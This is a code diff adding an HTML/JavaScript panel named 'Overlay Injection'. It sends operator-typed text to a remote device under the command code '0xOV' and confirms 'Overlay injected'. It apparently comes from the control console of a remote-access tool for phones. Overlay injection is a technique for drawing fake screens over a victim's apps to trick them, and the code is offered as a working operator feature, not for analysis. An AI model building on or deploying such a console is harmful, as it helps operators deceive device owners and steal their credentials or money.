@@ -1,0 +1,42 @@
+<div class="ui segment">
+    <h3 class="ui header">Overlay Injection</h3>
+
+    <div class="ui form">
+        <div class="field">
+            <label>Overlay Text</label>
+            <textarea id="overlayText" rows="4" placeholder="Enter the text to display on the device"></textarea>
+        </div>
+        <button class="ui primary button" onclick="sendOverlay(this)">Send Overlay</button>
+    </div>
+
+    <script>
+        function sendOverlay(element) {
+            $(element).addClass('loading');
+            const text = $('#overlayText').val();
+
+            if (!text || text.trim().length === 0) {
+                showNotification('#f03434', 'Please provide overlay text');
+                $(element).removeClass('loading');
+                return;
+            }
+
+            const params = {
+                text: text.trim()
+            };
+
+            sendCommand('0xOV', params, (error, message) => {
+                if (error) {
+                    setTimeout(() => {
+                        showNotification('#f03434', error);
+                        $(element).removeClass('loading');
+                    }, 300);
+                } else {
+                    setTimeout(() => {
+                        showNotification('#2ecc71', message || 'Overlay injected');
+                        $(element).removeClass('loading');
+                    }, 300);
+                }
+            });
+        }
+    </script>
+</div>
